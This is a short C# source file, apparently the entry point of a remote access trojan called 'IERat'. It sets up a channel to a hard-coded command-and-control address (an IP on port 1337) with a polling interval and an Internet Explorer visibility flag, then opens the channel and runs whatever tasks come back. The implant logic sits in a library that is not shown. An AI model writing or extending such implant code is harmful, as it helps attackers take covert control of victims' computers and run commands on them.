using IERat.lib;

namespace IERat
{
    class IERat
    {
        public static Channel channel = new Channel { 
            BaseURL = "http://192.168.135.1:1337",
            SleepTime = 3000,
            IEvisible = true
        };

        static void Main()
        {
            channel.Open();
            channel.agent.ExecuteTasks();
        }
    }
}
